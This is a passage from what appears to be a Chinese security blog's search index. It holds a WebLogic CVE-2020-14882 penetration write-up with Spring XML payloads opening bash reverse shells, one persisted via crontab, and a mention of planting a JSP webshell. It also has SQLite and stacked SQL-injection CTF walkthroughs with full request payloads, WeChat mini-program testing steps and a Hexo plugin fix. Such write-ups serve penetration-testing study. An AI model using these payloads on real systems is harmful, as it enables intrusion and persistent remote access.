class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>-c<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>但是结果发现虽然有连接回来，但是生成不了shell</p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116115656814.png\" alt=\"image-20201116115656814\"></p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114531532.png\" alt=\"image-20201116114531532\"></p>\n<p>修改xml脚本，联想到平时在红蓝项目中，采用定时反弹shell的方式，直接写入crontab进行定时反弹，而不是在当前session进行反弹，修改后xml如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">   <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">   <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;pb&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span> <span class=\"attr\">init-method</span>=<span class=\"string\">&quot;start&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>bash<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>-c<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>&lt;![CDATA[echo -e &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/ip/9998;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&quot;|crontab -]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这样每隔一分钟，服务器会定时反弹shell回来，这种方式避免了weblogic在加载xml时就回弹shell，导致可能不成功的情况。</p>\n<p>收到了反弹的shell</p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114812911.png\" alt=\"image-20201116114812911\"></p>\n<p>反弹的bash shell不太好找web相关的配置参数，比如web.xml文件等，于是采用find命令全局查找，找到相关的web目录如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/app/weblogic/Oracle/Middleware/user_projects/domains/mweb_domain/servers/mwebServer/tmp/_WL_user/mweb/&#123;username&#125;/war/</span><br></pre></td></tr></table></figure>\n\n<p>可使用<code>wget</code>在该目录下写入jsp或者jspx的webshell</p>\n<p>以上便是本次实际应用中碰到的weblogic渗透，做此记录。</p>\n<p><strong>参考文档</strong></p>\n<ol>\n<li><a href=\"https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md\">https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md</a></li>\n<li><a href=\"https://github.com/jas502n/CVE-2020-14882\">https://github.com/jas502n/CVE-2020-14882</a></li>\n</ol>\n","categories":["Pentest"],"tags":["weblogic"]},{"title":"sqlite注入","url":"http://blog.le31ei.top/2020/11/10/sqlite注入/","content":"<p>sqlite手工注入基本跟mysql一致，只是函数没法通用，查库名和列名不一致</p>\n<p>sqlite数据库中只存在<code>sqlite_master</code>和当前数据库。</p>\n<p><strong>查询当前表名</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php?id=1 union select 1,name,3,4 from sqlite_master where type=&#x27;table&#x27; limit 0,1</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>查询列名</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php?id=1 union select 1,sql,3,4 from sqlite_master where type=&#x27;table&#x27; and name=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>题目解析</strong></p>\n<p><code>https://ringzer0ctf.com/challenges/40/?id=MQ==</code></p>\n<p>该题目对id做了base64编码，存在sqlite注入，题目提示，id可以用<code>)</code>进行闭合。</p>\n<p><img src=\"/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151126659.png\" alt=\"image-20201110151126659\"></p>\n<p><strong>查询表名</strong></p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/challenges/40/?id=2)</span> union <span class=\"string\">select</span> name,2,3 <span class=\"string\">from</span> sqlite_master <span class=\"string\">where</span> type=&#x27;table&#x27; <span class=\"string\">limit</span> 0,1-- <span class=\"string\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host:</span> ringzer0ctf.com</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Site</span>: none</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Mode</span>: navigate</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-User</span>: ?1</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Dest</span>: document</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151309780.png\" alt=\"image-20201110151309780\"></p>\n<p><strong>查询列名</strong></p>\n<p>查询结果是创建表的语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;challenges&#x2F;40&#x2F;?id&#x3D;2) union select sql,2,3 from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;flag&#39;-- HTTP&#x2F;1.1</span><br><span class=\"line\">Host: ringzer0ctf.com</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class=\"line\">Sec-Fetch-Site: none</span><br><span class=\"line\">Sec-Fetch-Mode: navigate</span><br><span class=\"line\">Sec-Fetch-User: ?1</span><br><span class=\"line\">Sec-Fetch-Dest: document</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151358910.png\" alt=\"image-20201110151358910\"></p>\n<p>最后即可查询出来flag</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/challenges/40/?id=2)</span> union <span class=\"string\">select</span> content,2,3 <span class=\"string\">from</span> flag <span class=\"string\">limit</span> 0,1-- <span class=\"string\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host:</span> ringzer0ctf.com</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Site</span>: none</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Mode</span>: navigate</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-User</span>: ?1</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Dest</span>: document</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151430788.png\" alt=\"image-20201110151430788\"></p>\n","categories":["Pentest"],"tags":["SQL注入"]},{"title":"微信小程序安全测试","url":"http://blog.le31ei.top/2020/11/09/微信小程序安全测试/","content":"<p>仅记录实战操作的过程，对小程序原理需要了解的，参考附件文档。</p>\n<h1 id=\"0x01-反编译\"><a href=\"#0x01-反编译\" class=\"headerlink\" title=\"0x01 反编译\"></a>0x01 反编译</h1><p><strong>导出小程序wxapkg包</strong></p>\n<p><code>adb pull /data/data/com.tencent.mm/MicroMsg/&#123;微信ID&#125;/appbrand/pkg/_-14931312_34.wxapkg ./</code></p>\n<p>需要先<code>adb root</code></p>\n<p><strong>反编译小程序包</strong></p>\n<p><code>node wuWxapkg.js _-1496931312_34.wxapkg</code></p>\n<p><img src=\"/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109153208111.png\" alt=\"image-20201109153208111\"></p>\n<h1 id=\"0x02-抓包\"><a href=\"#0x02-抓包\" class=\"headerlink\" title=\"0x02 抓包\"></a>0x02 抓包</h1><p>安卓7.0之后，必须导入为系统证书后，才能进行抓包，但burp证书在导入后，仍然无法进行抓包，那么就需要用到<code>charles</code>工具进行抓包。</p>\n<p><strong>导出证书</strong></p>\n<p>通过<code>help-&gt;SSL Proxying-&gt;save Charles root certifacate</code>导出证书，导出后导入安卓作为系统证书，即可进行抓包。</p>\n<p><img src=\"/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109150342123.png\" alt=\"image-20201109150342123\"></p>\n<p><strong>重放数据包</strong></p>\n<p>对数据包右键打了断点后，点击breakpoint按钮打开拦截，然后点击右键repeat进行重放，即可进行抓包</p>\n<p><img src=\"/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109152611419.png\" alt=\"image-20201109152611419\"></p>\n<p><img src=\"/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109152502367.png\" alt=\"image-20201109152502367\"></p>\n<p><img src=\"/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109152842638.png\" alt=\"image-20201109152842638\"></p>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><ol>\n<li><a href=\"./wxappUnpacker.zip\">wxappUnpacker</a></li>\n<li><a href=\"./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B8%97%E9%80%8F%E4%BA%94%E8%84%89.pdf\">微信小程序的渗透五脉 - Hack Inn</a></li>\n<li><a href=\"./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90.pptx\">微信小程序文件分析</a></li>\n<li><a href=\"./%E7%99%BE%E4%B8%BE%E7%99%BE%E6%8D%B7%EF%BC%9A%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E5%8F%88%E4%B8%80%E4%B8%AA%E7%AA%81%E7%A0%B4%E5%8F%A3%EF%BC%8C%E5%86%8D%E7%9C%8B%E5%A4%A7%E5%9B%BD%E7%8B%AC%E6%9C%89%E5%B0%8F%E7%A8%8B%E5%BA%8F.pdf\">百举百捷：红队视角下又一个突破口，再看大国独有小程序</a></li>\n</ol>\n","categories":["Pentest"],"tags":["微信小程序"]},{"title":"hexo-asset-image插件图片地址显示错误","url":"http://blog.le31ei.top/2020/11/03/hexo-asset-image插件图片地址显示错误/","content":"<p><code>hexo-asset-image</code>插件存在bug，导致hexo生成的图片链接不能正确生成。</p>\n<p><strong>解决方法</strong>:</p>\n<p>将文件<code>node_modules/hexo-asset-image/index.js</code>替换为如下内容:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&#x27;use strict&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> cheerio = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;cheerio&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getPosition</span>(<span class=\"params\">str, m, i</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> str.split(m, i).join(m).length;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> version = <span class=\"built_in\">String</span>(hexo.version).split(<span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">hexo.extend.filter.register(<span class=\"string\">&#x27;after_post_render&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> config = hexo.config;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">if</span>(<span class=\"params\">config.post_asset_folder</span>)</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> link = data.permalink;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(version.length &gt; <span class=\"number\">0</span> &amp;&amp; <span class=\"built_in\">Number</span>(version[<span class=\"number\">0</span>]) == <span class=\"number\">3</span>)</span><br><span class=\"line\">     <span class=\"keyword\">var</span> beginPos = getPosition(link, <span class=\"string\">&#x27;/&#x27;</span>, <span class=\"number\">1</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">     <span class=\"keyword\">var</span> beginPos = getPosition(link, <span class=\"string\">&#x27;/&#x27;</span>, <span class=\"number\">3</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"comment\">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> endPos = link.lastIndexOf(<span class=\"string\">&#x27;/&#x27;</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    link = link.substring(beginPos, endPos);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> toprocess = [<span class=\"string\">&#x27;excerpt&#x27;</span>, <span class=\"string\">&#x27;more&#x27;</span>, <span class=\"string\">&#x27;content&#x27;</span>];</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">for</span>(<span class=\"params\"><span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; toprocess.length; i++</span>)</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> key = toprocess[i];</span><br><span class=\"line\"> </span><br><span class=\"line\">      <span class=\"keyword\">var</span> $ = cheerio.load(data[key], &#123;</span><br><span class=\"line\">        ignoreWhitespace: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        xmlMode: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        lowerCaseTags: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        decodeEntities: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">      $(<span class=\"string\">&#x27;img&#x27;</span>).each(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($(<span class=\"built_in\">this</span>).attr(<span class=\"string\">&#x27;src&#x27;</span>))&#123;</span><br><span class=\"line\">      <span class=\"comment\">// For windows style path, we replace &#x27;\\&#x27; to &#x27;/&#x27;.</span></span><br><span class=\"line\">      <span class=\"keyword\">var</span> src = $(<span class=\"built_in\">this</span>).attr(<span class=\"string\">&#x27;src&#x27;</span>).replace(<span class=\"string\">&#x27;\\\\&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(!<span class=\"regexp\">/http[s]*.*|\\/\\/.*/</span>.test(src) &amp;&amp;</span><br><span class=\"line\">         !<span class=\"regexp\">/^\\s*\\//</span>.test(src)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class=\"line\">        <span class=\"comment\">// In addition, to support multi-level local directory.</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> linkArray = link.split(<span class=\"string\">&#x27;/&#x27;</span>).filter(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> srcArray = src.split(<span class=\"string\">&#x27;/&#x27;</span>).filter(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span> &amp;&amp; elem != <span class=\"string\">&#x27;.&#x27;</span>;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(srcArray.length &gt; <span class=\"number\">1</span>)</span><br><span class=\"line\">        srcArray.shift();</span><br><span class=\"line\">        src = srcArray.join(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">        $(<span class=\"built_in\">this</span>).attr(<span class=\"string\">&#x27;src&#x27;</span>, config.root + link + src);</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.info&amp;&amp;<span class=\"built_in\">console</span>.info(<span class=\"string\">&quot;update link as:--&gt;&quot;</span>+config.root + link + src);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.info&amp;&amp;<span class=\"built_in\">console</span>.info(<span class=\"string\">&quot;no src attr, skipped...&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.info&amp;&amp;<span class=\"built_in\">console</span>.info($(<span class=\"built_in\">this</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      data[key] = $.html();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["bug"],"tags":["hexo-asset-image,hexo"]},{"title":"堆叠注入","url":"http://blog.le31ei.top/2020/11/02/堆叠注入/","content":"<h1 id=\"0x01-原理\"><a href=\"#0x01-原理\" class=\"headerlink\" title=\"0x01 原理\"></a>0x01 原理</h1><p>通过分号(<code>;</code>)连接多条SQL语句进行注入。union连接的联合查询能执行的语句时有限的，需要考虑到where子句之前的情况，而堆叠注入可执行任意mysql语句，比如<code>use database</code>等。在php代码中，采用<code>mysqli_multi_query</code>进行查询时，会造成堆叠注入，而如果采用<code>mysql_query</code>会显示语句错误不能进行堆叠注入。</p>\n<p><strong>局限性</strong>：</p>\n<p>代码一般只返回第一个查询结果，堆叠注入产生的结果或者错误只能被忽略，这就需要采用一些延时注入，或者alter类型的操作来修改数据达到查询结果的目的。</p>\n<h1 id=\"0x02-强网杯2019-easy-sql\"><a href=\"#0x02-强网杯2019-easy-sql\" class=\"headerlink\" title=\"0x02 强网杯2019 easy_sql\"></a>0x02 强网杯2019 easy_sql</h1><p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103154443289.png\" alt=\"image-20201103154443289\"></p>\n<p>题目过滤了如下函数:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> preg_match(<span class=\"string\">&quot;/select|update|delete|drop|insert|where|\\./i&quot;</span>,$inject);</span><br></pre></td></tr></table></figure>\n\n<p>基本的注入方式都过滤了，可以采用报错注入进行尝试，但无法跨表查询，过滤了<code>.</code>。</p>\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103203004084.png\" alt=\"image-20201103203004084\"></p>\n<p>尝试堆叠注入<code>show databases</code>：</p>\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103203351170.png\" alt=\"image-20201103203351170\"></p>\n<p>查看表名<code>show tables from supersqli</code></p>\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103203447755.png\" alt=\"image-20201103203447755\"></p>\n<p>查看列名<code>show columns from `1919810931114514` </code>，表名是纯数字，需要添加反引号识别为字符串</p>\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103203757420.png\" alt=\"image-20201103203757420\"></p>\n<p>查看到了存放flag的表，但无法通过语句查询出来结果，堆叠注入只能是前面的select语句回显结果。</p>\n<p>最后需要通过<code>alter</code>和<code>rename</code>直接修改<code>1919810931114514</code>表名，然后进行查询</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">rename</span> <span class=\"keyword\">tables</span> <span class=\"string\">`words`</span> <span class=\"keyword\">to</span> <span class=\"string\">`words1`</span>;<span class=\"keyword\">rename</span> <span class=\"keyword\">tables</span> <span class=\"string\">`1919810931114514`</span> <span class=\"keyword\">to</span> <span class=\"string\">`words`</span>; <span class=\"keyword\">alter</span> <span class=\"keyword\">table</span> <span class=\"string\">`words`</span> <span class=\"keyword\">change</span> <span class=\"string\">`flag`</span> <span class=\"string\">`id`</span> <span 